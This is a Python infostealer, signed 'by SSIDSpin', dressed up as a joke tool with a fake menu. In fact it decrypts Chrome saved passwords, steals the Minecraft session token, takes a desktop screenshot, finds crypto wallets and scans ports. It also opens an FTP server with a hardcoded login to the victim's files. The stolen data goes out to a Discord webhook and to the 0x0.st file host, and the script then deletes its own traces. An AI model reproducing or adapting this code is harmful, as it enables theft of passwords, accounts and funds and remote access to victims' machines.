import os
import re
import sys
import json
import base64
import sqlite3
import win32crypt
import shutil
import os
import re
import requests
import discord
import time
import socket
import threading
import logging
import uuid
from Cryptodome.Cipher import AES
from pyftpdlib.authorizers import DummyAuthorizer
from pyftpdlib.handlers import FTPHandler
from pyftpdlib.servers import FTPServer
from PIL import ImageGrab,Image


Webhook = ""


def fakeMessage():
    os.remove("LatestLog.txt")
    os.remove(screenshot_path)
    logo = ("""\033[1;36;40m
    ╭━━━╮╱╱╱╱╱╱╱╱╱╭━╮╱╱╱╱╱╱╱╭━━━━╮╱╱╱╱╭╮
    ┃╭━╮┃╱╱╱╱╱╱╱╱╱┃╭╯╱╱╱╱╱╱╱┃╭╮╭╮┃╱╱╱╱┃┃
    ┃╰━━┳━━┳━━┳━━┳╯╰┳┳━╮╭━━╮╰╯┃┃┣┻━┳━━┫┃
    ╰━━╮┃╭╮┃╭╮┃╭╮┣╮╭╋┫╭╮┫╭╮┃╱╱┃┃┃╭╮┃╭╮┃┃
    ┃╰━╯┃╰╯┃╰╯┃╰╯┃┃┃┃┃┃┃┃╰╯┃╱╱┃┃┃╰╯┃╰╯┃╰╮
    ╰━━━┫╭━┻━━┻━━╯╰╯╰┻╯╰┻━╮┃╱╱╰╯╰━━┻━━┻━╯
    ╱╱╱╱┃┃╱╱╱╱╱╱╱╱╱╱╱╱╱╱╭━╯┃
    ╱╱╱╱╰╯╱╱╱╱╱╱╱╱╱╱╱╱╱╱╰━━╯by SSIDSpin""")
    os.system('cls||clear')
    print(logo)
    i=0.5
    while i < 4:
        print("Loading" + "." * int(i))
        time.sleep(i)
        i += 1
    os.system('cls||clear')
    print(logo)
    if len(sys.argv) == 1:
        run_in_background()
    while True:
        print("""\nSelect Option (Use Numbers To Make A Choice)
        1 -> Spoof HWID
        2 -> Find GF
        3 -> Hack Nasa
        4 -> Obtain A Life
        """)
        option = input("Enter your choice: ")
        
        if option == "1":
            print("Option 1 Selected: Starting Spoofing HWID Now")
            print("Spoofing Now")
        elif option == "2":
            print("Option 2 Selected: Finding GF")
            
        elif option == "3":
            print("Option 3 Selected: Hacking Nasa")
            
        elif option == "4":
            print("Option 4 Selected: Obtaining A Life")
            
        else:
            print("Invalid option. Please select a valid option.")



CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
LatestLog_Path = os.path.normpath(os.path.join(os.getenv('USERPROFILE'), r'AppData\Roaming\.minecraft\logs\latest.log'))
Wallets = []
hostname = socket.gethostname()
ip_address = socket.gethostbyname(hostname)
PCName = os.environ.get( " USERNAME" )
PortList = []
unique_id = str(uuid.uuid4()).replace('-', '')
screenshot_path = f"{unique_id}.png"
screenshot = ImageGrab.grab(all_screens=True,xdisplay=None,include_layered_windows=False,bbox=None)
screenshot.save(screenshot_path)
screenshot.close()
logging.basicConfig(level=logging.CRITICAL)
Uploadlink = []

def get_secret_key():
    try:
        with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
            local_state = f.read()
            local_state = json.loads(local_state)
        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        secret_key = secret_key[5:] 
        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
        return secret_key
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome secretkey cannot be found")
        return None

def extract_session_id(log_file):
    with open(log_file, 'r') as file:
        for line in file:
            match = re.search(r'token:(\S+)', line)
            if match:
                token = match.group(1)
                token = token[:-1]
                return token
    file.close()
    return None
session_id = extract_session_id(LatestLog_Path)


def extract_username(log_file):
    with open(log_file, 'r') as file:
        for line in file:
            match = re.search(r'Setting user:\s*(\S+)', line)
            if match:
                return match.group(1)
    file.close()
    return None
player_id = extract_username(LatestLog_Path)


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)

def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)

def decrypt_password(ciphertext, secret_key):
    try:
        initialisation_vector = ciphertext[3:15]
        encrypted_password = ciphertext[15:-16]
        cipher = generate_cipher(secret_key, initialisation_vector)
        decrypted_pass = decrypt_payload(cipher, encrypted_password)
        decrypted_pass = decrypted_pass.decode()  
        return decrypted_pass
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Unable to decrypt, Chrome version <80 not supported. Please check.")
        return ""
    
def get_db_connection(chrome_path_login_db):
    try:
        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
        return sqlite3.connect("Loginvault.db")
    except Exception as e:
        print("%s"%str(e))
        print("[ERR] Chrome database cannot be found")
        return None

def send_to_discord(webhook_url, content=None, embed=None, file_path=None):
    data = {}
    if content:
        data["content"] = content
    if embed:
        data["embeds"] = [embed.to_dict()]

    headers = {"Content-Type": "multipart/form-data"}
    payload = {"payload_json": json.dumps(data)}
    
    files = {}
    if file_path:
        with open(file_path, "rb") as file:
            files = {"file": (file_path, file)}
            response = requests.post(webhook_url, data=payload, files=files)
    else:
        response = requests.post(webhook_url, json=data)

    if response.status_code != 204:
        raise Exception(f"Failed to send message to Discord webhook: {response.status_code}, {response.text}")
    

ip = socket.gethostbyname(socket.gethostname())
for port in range(65535):
    try:
        serv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        serv.bind((ip, port))
        serv.close()
    except:
        PortList.append(port)
ports_string = ', '.join(map(str, PortList))

def start_ftp():
    authorizer = DummyAuthorizer()
    authorizer.add_user("SSIDSpin", "Admin", ".", perm="elradfmwMT") # User, Password
    handler = FTPHandler
    handler.authorizer = authorizer
    server = FTPServer((ip_address, 21), handler)
    server.serve_forever()

def run_in_background():
    ftp_thread = threading.Thread(target=start_ftp)
    ftp_thread.daemon = True  
    ftp_thread.start()

def uploadimage(file_path):
    upload_url = 'https://0x0.st'
    with open(file_path, 'rb') as file:
        response = requests.post(upload_url, files={'file': file})
    file.close()
    if response.status_code == 200:
        file_url = response.text.strip()
        return file_url
    else:
        return None

def find_wallets():
    base_paths = {
        "Exodus": [
            r"AppData\Local\Programs\Exodus",
            r"AppData\Roaming\Exodus"
        ],
        "Electrum": [
            r"AppData\Local\Electrum",
            r"AppData\Roaming\Electrum"
        ],
        "MetaMask": [
            r"AppData\Local\MetaMask",
            r"AppData\Roaming\MetaMask",
            r"AppData\Local\BraveSoftware\Brave-Browser\User Data\Default\Extensions\chrome-extension_"
            r"AppData\Local\Google\Chrome\User Data\Default\Extensions\nkbihfbeogaeaoehlefnkodbefgpgknn"
        ],
        "Coinbase Wallet": [
             r"AppData\Local\Google\Chrome\User Data\Default\Extensions\pgpmpfhiifbpfdjlmgldabkijcclkkdl"
        ]
    }

    user_profile = os.path.expanduser("~")
    found_wallets = []
    for wallet, paths in base_paths.items():
        possible_paths = [os.path.normpath(os.path.join(user_profile, path)) for path in paths]
        for path in possible_paths:
            if os.path.isdir(path):
                found_wallets.append(wallet)
                break

    return found_wallets


Wallets = ", ".join(find_wallets()) if find_wallets() else "No Wallets found."
Uploadlink = uploadimage(screenshot_path)
if __name__ == '__main__':
    try:
        with open('LatestLog.txt', mode='w', encoding='utf-8') as decrypt_password_file:
            secret_key = get_secret_key()
            PCInfo=discord.Embed(
                title =f"{hostname} PC Stats",
                colour = 0x1E2124
            )
            PCInfo.add_field(name="**:mechanic: Host Name**:", value=f"{hostname}", inline=True)
            PCInfo.add_field(name="**:computer: IP Address**:", value=f"{ip_address}", inline=True)
            PCInfo.add_field(name="**:map: Open Ports**:", value=f"{ports_string}", inline=False)
            PCInfo.add_field(name="**:moneybag: Crypto Wallets Installed On PC:**", value=f"{Wallets}", inline=False)
            PCInfo.add_field(name="**:wireless: FTP Connection Login:**", value=f"IP:{ip_address}"+":21\n Username: SSIDSpin \n Password: Admin", inline=False)
            send_to_discord(Webhook, embed=PCInfo)
            DiscordInfo=discord.Embed(
                title=f"[user'sdiscordname] Discord Information",
                color= 0x5865F2
            )
            DiscordInfo.add_field(name="**:id: Discord ID:**", value="```Coming Soon```", inline=True)
            DiscordInfo.add_field(name="**:envelope_with_arrow: Email:**", value="```Coming Soon```", inline=True)
            DiscordInfo.add_field(name="**:mobile_phone: Phone:**", value="```Coming Soon```\n\n", inline=True)
            DiscordInfo.add_field(name="**:identification_card: 2FA:**", value="```Coming Soon```", inline=True)
            DiscordInfo.add_field(name="**:tada: Nitro:**", value="```Coming Soon```", inline=True)
            DiscordInfo.add_field(name="**:credit_card: Billing:**", value="```Coming Soon```", inline=True)
            DiscordInfo.add_field(name="**:ice_cube: Discord Token:**", value="```Coming Soon```", inline=True)
            send_to_discord(Webhook, embed=DiscordInfo)
            RobloxAccount=discord.Embed(
                title=f"{hostname} Roblox Account Info",
                color= 0xC2DAB8
            )
            RobloxAccount.add_field(name="**:paperclip: Roblox Profile URL:**", value="```Coming Soon```", inline=True)
            RobloxAccount.add_field(name="**:cookie: Roblox Username:**", value="```Coming Soon```", inline=True)
            RobloxAccount.add_field(name="**:envelope_with_arrow: Roblox Email:**", value="```Coming Soon```", inline=True)
            RobloxAccount.add_field(name="**:moneybag: Robux:**", value="```Coming Soon```", inline=True)
            RobloxAccount.add_field(name="**:white_check_mark: Is Verified:**", value="```Coming Soon```", inline=True)
            RobloxAccount.add_field(name="**:cookie: Roblox Cookie:**", value="```Coming Soon```", inline=False)
            send_to_discord(Webhook,embed=RobloxAccount)

            MCAccount=discord.Embed(
                title=f"{hostname} Minecraft Account Info",
                color= 0x75E6DA
            )
            MCAccount.add_field(name="**:man_technologist: Player Name:**", value=f"{player_id}", inline=True)
            MCAccount.add_field(name="**:unlock: Minecraft SSID:**", value=f"{session_id}", inline=True)

            UsersCurrentScreen=discord.Embed(
                title=f"{hostname} Desktop Screenshot",
                color= 0xBB11DA
            )
            UsersCurrentScreen.set_image(url=Uploadlink)
            send_to_discord(Webhook, embed=UsersCurrentScreen)


            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$", element) is not None]
            all_logins = ""

            for folder in folders:
                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data" % (CHROME_PATH, folder))
                conn = get_db_connection(chrome_path_login_db)
    
                if secret_key and conn:
                    cursor = conn.cursor()
                    cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
        
                    for index, login in enumerate(cursor.fetchall()):
                        url = login[0]
                        username = login[1]
                        ciphertext = login[2]
            
                        if url and username and ciphertext:
                            decrypted_password = decrypt_password(ciphertext, secret_key)
                            all_logins += f"**URL**: {url}\n**User Login**: {username}\n**Password**: {decrypted_password}\n\n"
        
                    cursor.close()
                    conn.close()
                    os.remove("Loginvault.db")
            if all_logins:
                with open("chrome_logins.txt", "w", encoding="utf-8") as file:
                    file.write(all_logins)
                chrome_log_path = "chrome_logins.txt"
                chromeupload = uploadimage(chrome_log_path)
                ChromeData = discord.Embed(
                title = f"{hostname} Chrome Saved Passwords",
                description=f"{all_logins}",
                colour = 0xFFA700
                )
                ChromeData.add_field(name="**Chrome Data Has Been Uploaded To:**", value=f"```{chromeupload}```", inline=True)
                send_to_discord(Webhook, embed=ChromeData)
                os.remove("chrome_logins.txt")
            send_to_discord(Webhook, embed=MCAccount)
            fakeMessage()

    except Exception as e:#Error 32, can occur IDK why but it sends a red flag even if it gets data. Dont know. Dont care
        if all_logins == "":
            ChromeDataError = discord.Embed(
            title = f"{hostname} No Stored Chrome Passwords",
            description = "",
            colour = 0xEE4B2B
            )
            send_to_discord(Webhook, embed=ChromeDataError)
        fakeMessage()